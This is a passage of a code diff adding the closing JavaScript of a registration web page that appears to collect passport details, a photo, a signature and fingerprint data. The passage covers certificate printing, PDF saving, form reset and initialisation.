+    qrDiv.textContent = STATE.regId;
+  }
+}
+
+/* ============== PRINT / PDF ============== */
+$('#printBtn').addEventListener('click', ()=>{
+  populateCertificate();
+  setTimeout(()=> window.print(), 100);
+});
+$('#downloadPdfBtn').addEventListener('click', ()=>{
+  populateCertificate();
+  setTimeout(()=>{
+    showToast('Opening print dialog — choose "Save as PDF"');
+    window.print();
+  }, 100);
+});
+
+/* ============== RESET ============== */
+function resetAll(){
+  STATE.applicant = {}; STATE.photoDataUrl=''; STATE.regId=''; STATE.regDate=''; STATE.regTime='';
+  STATE.biometrics = { left:[], right:[] };
+  STATE.signatureDataUrl = '';
+  ['fullName','passport','phone','nationality','photo'].forEach(id=>{
+    const el = $('#'+id);
+    if(el.type==='file'){ el.value=''; } else { el.value=''; }
+    clearErr(id);
+  });
+  $('#photoPreview').classList.remove('show');
+  sigHasInk = false;
+  $('#sigPadWrap')?.classList.remove('has-ink');
+  $('#sigSavedBadge')?.classList.remove('show');
+  $('#saveSigBtn') && ($('#saveSigBtn').disabled = true);
+  $('#continueAfterSigBtn') && ($('#continueAfterSigBtn').disabled = true);
+  currentHand = null; currentFingerIdx = 0;
+  buildFingerGrids();
+}
+
+/* ============== INIT ============== */
+buildFingerGrids();
+applyLang();
+
+// Prevent default touch behaviors that might interfere
+document.addEventListener('gesturestart', e=>e.preventDefault());
+
+})();
+</script>
 </body>
 </html>
-
